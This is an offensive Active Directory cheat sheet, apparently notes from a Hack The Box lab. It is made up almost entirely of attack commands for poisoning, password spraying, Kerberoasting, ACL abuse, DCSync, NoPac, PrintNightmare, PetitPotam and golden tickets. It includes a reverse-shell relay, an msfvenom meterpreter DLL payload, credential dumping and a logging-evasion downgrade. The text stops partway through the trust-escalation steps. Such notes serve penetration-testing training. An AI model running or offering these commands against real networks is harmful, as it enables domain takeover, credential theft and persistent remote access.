
---
## External Recon

```bash
# ASN / IP space
# https://bgp.he.net → enter domain/IP
# https://viewdns.info → reverse IP, DNS history

# Email/username harvesting
# https://www.linkedin.com → manual scrape
python3 linkedin2username.py -c <COMPANY> -n <DOMAIN>

# Breach credential search
python3 dehashed.py -q <domain.local> -p    # requires API key

# Google dorks
filetype:pdf inurl:<domain.com>
intext:"@<domain.com>" inurl:<domain.com>
```

**Username format derivation** → find PDF metadata: Author field often reveals format (first.last, flast, F9L8 GUID, etc.)

> [!tip] Breach data + Kerbrute userenum = fast internal foothold. Even old/disabled-account passwords are worth trying for password reuse.

---

## Initial Internal Enumeration (Unauthenticated)

**Passive — identify hosts without sending packets:**

```bash
# Wireshark (GUI) or tcpdump (CLI)
sudo tcpdump -i ens224

# Responder analyze mode (no poisoning)
sudo responder -I ens224 -A
```

**Active — ICMP sweep:**

```bash
fping -asgq 172.16.5.0/23
# -a = alive only, -s = stats, -g = CIDR range, -q = quiet
```

**Nmap — scan alive hosts:**

```bash
sudo nmap -v -A -iL hosts.txt -oA /home/htb-student/host-enum
# DC signature ports: 53, 88, 135, 139, 389, 445, 464, 636, 3268, 3269, 3389
```

**DC identification from Nmap output:**

- Port 88 (Kerberos) = Domain Controller
- `rdp-ntlm-info` reveals `NetBIOS_Computer_Name`, `DNS_Domain_Name`

**Kerbrute user enumeration (no auth required, stealthy):**

```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt -o valid_ad_users
# Does NOT generate event ID 4625 (logon failure)
# DOES generate event ID 4768 (TGT requested) if Kerberos logging enabled
```

> [!warning] SYSTEM access on domain-joined host = equivalent to low-priv domain user for enumeration. Paths to SYSTEM: EternalBlue, local privesc, SeImpersonate + JuicyPotato/PrintSpoofer.

---

## LLMNR / NBT-NS Poisoning

**How it works:** When DNS fails, Windows broadcasts LLMNR (UDP 5355) and NBT-NS (UDP 137). Responder answers these broadcasts → victim sends NTLMv2 hash.

### From Linux — Responder

```bash
sudo responder -I ens224

# Key flags
# -A = analyze mode (no poisoning, passive)
# -w  = WPAD rogue proxy (captures all HTTP)
# -f  = fingerprint OS

# Hashes saved to /usr/share/responder/logs/
# Format: SMB-NTLMv2-SSP-<IP>.txt

# Crack captured NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### From Windows — Inveigh

```powershell
# PowerShell version
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version (InveighZero)
.\Inveigh.exe
# Press ESC to enter interactive console
# GET NTLMV2UNIQUE   → unique hashes
# GET NTLMV2USERNAMES → usernames + source IPs
# STOP               → stop capture
```

**NTLM Relay (instead of cracking):**

```bash
# 1. Disable SMB in /etc/responder/Responder.conf: SMB = Off
# 2. Run relay
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
# Default: dumps SAM database

# Relay + exec command
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <BASE64>'

# 3. Catch reverse shell
nc -lvnp 9001
```

**Mitigation detection signals:** Event IDs 4697 (service install), 7045 (new service), registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast`

---

## Password Spraying

### Enumerate Password Policy First

```bash
# CME (credentialed)
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# SMB NULL session (unauthenticated)
rpcclient -U "" -N 172.16.5.5
rpcclient $> getdompwinfo
# or
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight

# LDAP anonymous bind
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Windows (domain-joined)
net accounts                          # CMD
Get-DomainPolicy | select -ExpandProperty SystemAccess   # PowerView
```

**Key policy fields:** `lockoutThreshold`, `lockoutDuration`, `resetLockoutCount`, `minPwdLength`, `pwdProperties` (1 = complexity enabled)

> [!warning] Safe spray rule: lockoutThreshold - 2 attempts, wait lockoutDuration + 5 min between rounds. NEVER spray with more attempts than threshold-1. Document every attempt with timestamp.

### Build User List

```bash
# SMB NULL session
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N 172.16.5.5 → enumdomusers
crackmapexec smb 172.16.5.5 --users         # unauthenticated
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users  # credentialed

# LDAP anonymous bind
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# Kerbrute (no auth, validates against Kerberos)
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Execute Spray

```bash
# Linux — rpcclient one-liner
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# Linux — Kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Linux — CrackMapExec (grep + = successes)
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Validate credential
crackmapexec smb 172.16.5.5 -u avazquez -p Password123

# Local admin hash spray across subnet
crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

```powershell
# Windows — DomainPasswordSpray (auto-enumerates users from AD, respects policy)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## Enumerating Security Controls

```powershell
# Windows Defender status
Get-MpComputerStatus | select RealTimeProtectionEnabled,AMServiceEnabled,AntispywareEnabled

# AppLocker rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell language mode
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage = restricted, FullLanguage = unrestricted

# LAPS — who can read LAPS passwords
Find-LAPSDelegatedGroups           # groups with LAPS read rights per OU
Find-AdmPwdExtendedRights          # users with AllExtendedRights (can read LAPS)
Get-LAPSComputers                  # computers with LAPS + cleartext password if accessible

# Firewall state
netsh advfirewall show allprofiles

# Defender check (CMD)
sc query windefend

# Downgrade PowerShell to v2 (evades script block logging)
powershell.exe -version 2
# Confirm: Get-Host → Version: 2.0
```

> [!tip] PowerShell v2 downgrade escapes script block logging (PSv3+ only). Logs still show `powershell.exe -version 2` was run — defender may notice and investigate.

---

## Credentialed Enumeration — From Linux

### CrackMapExec (NetExec)

```bash
# Domain user enumeration
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
# badpwdcount field → skip users near lockout

# Group enumeration
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# Logged-on users (pivot target hosts)
crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
# (Pwn3d!) = local admin on that host

# Share enumeration
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Spider share for sensitive files
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
# Output → /tmp/cme_spider_plus/<IP>.json

# Remote exec
crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' -x 'whoami' --exec-method smbexec
crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' -X 'whoami'   # PowerShell

# SAM dump
crackmapexec smb 172.16.5.5 -u administrator -p 'Password123!' --sam

# Pass-the-Hash
crackmapexec smb 172.16.5.5 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

### SMBMap

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
smbmap -u forend -p Klmcargo2 -H 172.16.5.5 --download "notes\note.txt"
```

### rpcclient

```bash
rpcclient -U "" -N 172.16.5.5          # null session
rpcclient -U "forend%Klmcargo2" 172.16.5.5

rpcclient $> enumdomusers              # list users + RIDs
rpcclient $> queryuser 0x457           # query by RID
rpcclient $> querydominfo              # domain info
rpcclient $> getdompwinfo              # password policy
```

### Impacket

```bash
# PSExec — drops to SYSTEM via SMB service upload
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

# WMIExec — semi-interactive, runs as user (not SYSTEM), fewer logs
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5

# secretsdump — DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
secretsdump.py -outputfile hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
# -just-dc-ntlm = NTLM only; -just-dc-user = specific user; -pwd-last-set; -history; -user-status
```

### windapsearch

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
# -PU = privileged users (recursive nested group membership)
```

### BloodHound.py

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
# Produces: computers.json, domains.json, groups.json, users.json
zip -r ilfreight_bh.zip *.json
# Upload zip to BloodHound GUI
# Start neo4j: sudo neo4j start
# Start GUI: bloodhound
```

---

## Credentialed Enumeration — From Windows

### AD PowerShell Module

```powershell
Import-Module ActiveDirectory

# Domain info
Get-ADDomain

# SPN accounts (Kerberoasting targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Trust relationships
Get-ADTrust -Filter *

# Group enumeration
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"

# Check reversible encryption
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

### PowerView

```powershell
Import-Module .\PowerView.ps1

# User info
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,memberof,pwdlastset,lastlogontimestamp,admincount,serviceprincipalname,useraccountcontrol

# SPN users (Kerberoasting)
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# ASREPRoasting targets
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol

# Recursive group membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Trust mapping
Get-DomainTrustMapping
Get-DomainTrust

# Test local admin access
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Find computers where Domain Users are local admin
# BloodHound query: Find Computers where Domain Users are Local Admin

# PASSWD_NOTREQD flag
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

# Find passwords in description field
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

### SharpHound (BloodHound Ingestor)

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
# Upload resulting zip to BloodHound GUI
```

### Snaffler

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
# -s = print to console, -d = domain, -o = output file, -v data = show only findings
# Color codes: Red = high priority (keys, certs, SQL dumps), Black = medium
```

---

## Living Off the Land (No Tools)

```powershell
# Host info
hostname
[System.Environment]::OSVersion.Version
systeminfo

# Patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Network
ipconfig /all
arp -a
route print
netsh advfirewall show allprofiles

# Domain info
echo %USERDOMAIN%
echo %logonserver%
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

# Active sessions
qwinsta

# Users/groups (CMD - use net1 instead of net to avoid some detections)
net accounts /domain
net group /domain
net group "Domain Admins" /domain
net group "domain computers" /domain
net user /domain
net user %username%
net localgroup administrators /domain

# AD PowerShell dsquery (available on DC or with RSAT)
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
# Users without Kerberos pre-auth (PASSWD_NOTREQD)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
# Find DCs
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

# PowerShell history (may contain passwords)
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Environment variables
Get-ChildItem Env: | ft Key,Value

# WMI
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic useraccount list /format:list
wmic group list /format:list
```

---

## Kerberoasting

**Concept:** Any domain user can request a TGS for any SPN. TGS encrypted with service account's NTLM hash → crack offline. Hashcat mode `13100` (RC4/etype 23), `19700` (AES256/etype 18).

### From Linux

```bash
# List SPN accounts
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Request all TGS tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Request specific user
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# Crack
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

# Cross-forest Kerberoasting
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

### From Windows — Rubeus

```powershell
# Stats overview
.\Rubeus.exe kerberoast /stats

# All tickets (high-value: admincount=1)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Single user
.\Rubeus.exe kerberoast /user:sqldev /nowrap

# Force RC4 on AES accounts (faster cracking)
.\Rubeus.exe kerberoast /rc4opsec /nowrap
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap

# Cross-forest
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

### From Windows — PowerView + Mimikatz (manual)

```powershell
# Request ticket into memory
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Export with Mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

```bash
# Process exported .kirbi or base64 blob
echo "<base64>" | tr -d \\n | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > hashcat_format
hashcat -m 13100 hashcat_format /usr/share/wordlists/rockyou.txt
```

> [!warning] AES tickets (etype 18) crack ~100x slower than RC4 (etype 23). Use `/tgtdeleg` or `/rc4opsec` to force RC4 downgrade. Does NOT work against Windows Server 2019 DCs — will always return highest supported encryption.

---

## ASREPRoasting

**Concept:** Users with `DONT_REQ_PREAUTH` set → request AS-REP without password. Encrypted with user's hash → crack offline. Hashcat mode `18200`.

```bash
# From Linux — find + retrieve
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

# From Linux — single user
GetNPUsers.py INLANEFREIGHT.LOCAL/mmorgan -dc-ip 172.16.5.5 -no-pass

# Crack
hashcat -m 18200 asrep_hash /usr/share/wordlists/rockyou.txt
```

```powershell
# PowerView — find targets
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol

# Rubeus
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Kerbrute — auto-extracts AS-REP during user enum
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

---

## ACL Enumeration & Abuse

**Key ACEs for attack:**

|ACE|Abuse Method|
|---|---|
|ForceChangePassword|Set-DomainUserPassword|
|GenericWrite (user)|Set fake SPN → Kerberoast|
|GenericWrite (group)|Add-DomainGroupMember|
|GenericAll|All of the above + Set-DomainObjectOwner|
|WriteOwner|Set-DomainObjectOwner|
|WriteDACL|Add-DomainObjectACL|
|AddSelf|Add-DomainGroupMember|
|DS-Replication-Get-Changes + DS-Replication-Get-Changes-All|DCSync|

### Enumeration

```powershell
# Get SID of controlled user
$sid = Convert-NameToSid wley

# Find all objects wley has rights over
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Map GUID to readable name (if no ResolveGUIDs)
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,rightsGuid | ?{$_.rightsGuid -eq $guid}

# Check DCSync rights for a user
$sid = "S-1-5-21-...-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}

# BloodHound: Node Info → Outbound Control Rights → First Degree / Transitive
```

### Attack Chain Example (wley → damundsen → Help Desk → IT Group → adunn → DCSync)

```powershell
# Step 1: Authenticate as wley
$SecPassword = ConvertTo-SecureString '<wley_password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Step 2: Force change damundsen's password (ForceChangePassword right)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# Step 3: Auth as damundsen
$SecPassword2 = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword2)

# Step 4: Add damundsen to Help Desk Level 1 (GenericWrite over group)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# Step 5: Set fake SPN on adunn (GenericAll via IT Group → adunn)
# (damundsen inherits IT Group rights via Help Desk Level 1 nested membership)
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Step 6: Kerberoast adunn
.\Rubeus.exe kerberoast /user:adunn /nowrap
# Crack hash → get adunn's password

# Cleanup (reverse order)
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

---

## DCSync

**Requirement:** Account with DS-Replication-Get-Changes + DS-Replication-Get-Changes-All (default: Domain Admins, Enterprise Admins)

```bash
# From Linux
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
# Files produced: .ntds, .ntds.cleartext, .ntds.kerberos

# Useful flags
# -just-dc-ntlm  = NTLM only
# -just-dc-user  = single user
# -pwd-last-set  = include password age
# -history       = include password history
# -user-status   = enabled/disabled flag
```

```powershell
# From Windows — Mimikatz (must run in context of account with DCSync rights)
# If needed: runas /netonly /user:INLANEFREIGHT\adunn powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\krbtgt
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator /domain:INLANEFREIGHT.LOCAL
```

**Cleartext from reversible encryption:**

```bash
cat inlanefreight_hashes.ntds.cleartext   # accounts with ENCRYPTED_TEXT_PWD_ALLOWED

# Check which users have reversible encryption
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

---

## Privileged Access — RDP / WinRM / MSSQL

### RDP Enumeration & Access

```powershell
# Enumerate RDP access
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
# BloodHound: Node Info → Execution Rights → CanRDP
# BloodHound pre-built: "Find Workstations where Domain Users can RDP"

# Connect
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### WinRM Enumeration & Access

```powershell
# Enumerate
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
# BloodHound Cypher: MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# Connect from Windows
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

```bash
# Connect from Linux
evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'
evil-winrm -i 10.129.201.234 -u forend -H <NTLM_HASH>   # pass-the-hash
```

### MSSQL Enumeration & Access

```powershell
# Enumerate with PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
# BloodHound Cypher: MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

```bash
# From Linux
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
# SeImpersonatePrivilege = path to SYSTEM via PrintSpoofer/RoguePotato
```

### Kerberos Double Hop — Workarounds

**Problem:** WinRM/PSRemoting uses Kerberos tickets (not passwords) → credentials not cached → can't authenticate to 3rd host.

```powershell
# Workaround 1: PSCredential object (works with evil-winrm)
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
get-domainuser -spn -credential $Cred | select samaccountname

# Workaround 2: Register PSSession Configuration (requires GUI/RDP, not evil-winrm)
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
Restart-Service WinRM
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
# Now klist shows full TGT cached
```

---

## Bleeding Edge Vulnerabilities

### NoPac (CVE-2021-42278 + CVE-2021-42287) — SamAccountName Spoofing

**Requirement:** Standard domain user, ms-DS-MachineAccountQuota > 0 (default: 10)

```bash
# Check if vulnerable
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Exploit — get SYSTEM shell on DC
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# Exploit — DCSync
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

```bash
# Check Print Spooler exposed
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Generate DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Host payload
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# MSF listener (port 8080)
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225 / set LPORT 8080

# Exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
# → Meterpreter SYSTEM shell on DC
```

### PetitPotam (CVE-2021-36942) — MS-EFSRPC

**Requirement:** AD CS present, unauthenticated (patched version requires auth)

```bash
# Step 1: Start NTLM relay targeting AD CS web enrollment
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Step 2: Coerce DC authentication
python3 PetitPotam.py 172.16.5.225 172.16.5.5
# ntlmrelayx.py obtains base64 cert for DC01$

# Step 3: Request TGT using cert
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
# Note AS-REP encryption key printed

# Step 4: Set KRB5CCNAME + DCSync
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Alternate: get NT hash from TGT
python /opt/PKINITtools/getnthash.py -key <AS_REP_KEY> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
# Then secretsdump with -hashes aad3c435b514a4ee:<NT_HASH>
```

```powershell
# From Windows — Rubeus with base64 cert
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<BASE64_CERT> /ptt
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

---

## Miscellaneous Misconfigurations

### GPP (Group Policy Preferences) Passwords

```bash
# Search SYSVOL manually
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
# Look for Groups.xml, Registry.xml, scheduledtasks.xml, services.xml, printers.xml

# Decrypt cpassword
gpp-decrypt <CPASSWORD_VALUE>

# CME modules
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

### Password in Description / SYSVOL Scripts

```powershell
# Check description field
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

# Check SYSVOL scripts
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

### DNS Enumeration with adidnsdump

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r    # -r resolves unknown records
cat records.csv
```

### Exchange-Related Abuse

```powershell
# Exchange Windows Permissions group → WriteDACL on domain → DCSync rights
# Organization Management → full mailbox access

# PrivExchange: PushSubscription feature → force Exchange→attacker auth → LDAP relay → DCSync
# Printer Bug (MS-RPRN): spooler runs as SYSTEM → force auth → relay or crack

# Check Printer Bug
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

---

## Domain Trusts

### Enumeration

```powershell
# Built-in
Get-ADTrust -Filter *
# Key fields: Direction (BiDirectional/Inbound/Outbound), IntraForest (child domain), ForestTransitive (external forest)

# PowerView
Get-DomainTrust
Get-DomainTrustMapping

# Enumerate users in child domain
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

# netdom
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
```

```bash
# Linux BloodHound — enumerate trust domains
# Edit /etc/resolv.conf: domain INLANEFREIGHT.LOCAL, nameserver 172.16.5.5
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
# Repeat for FREIGHTLOGISTICS.LOCAL pointing to 172.16.5.238
# BloodHound GUI: Analysis → "Map Domain Trusts"
```

### Child → Parent Escalation (ExtraSids / Golden Ticket)

**Required data:**

- KRBTGT hash of child domain
- Child domain SID
- Target username (fake user ok)
- Child domain FQDN
- Enterprise Admins SID of root domain (root_SID + `-519`)

```powershell
# Step 1: DCSync krbtgt of child domain
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
# Note: Hash NTLM, Object Security ID (child SID)

# Step 2: Get Enterprise Admins SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
# → S-1-5-21-3842939050-3880317879-2865463114-519

# Step 3: Forge Golden Ticket (Mimikatz)
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# Verify + use
klist
ls \\academy-ea-dc01.inlanefreight.local\c$
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator /domain:INLANEFREIGHT.LOCAL

# Step 3 alt: Rubeus
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

```bash
# From Linux
# Step 1: Get krbtgt hash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# Step 2: Get child domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

# Step 3: Get Enterprise Admins SID
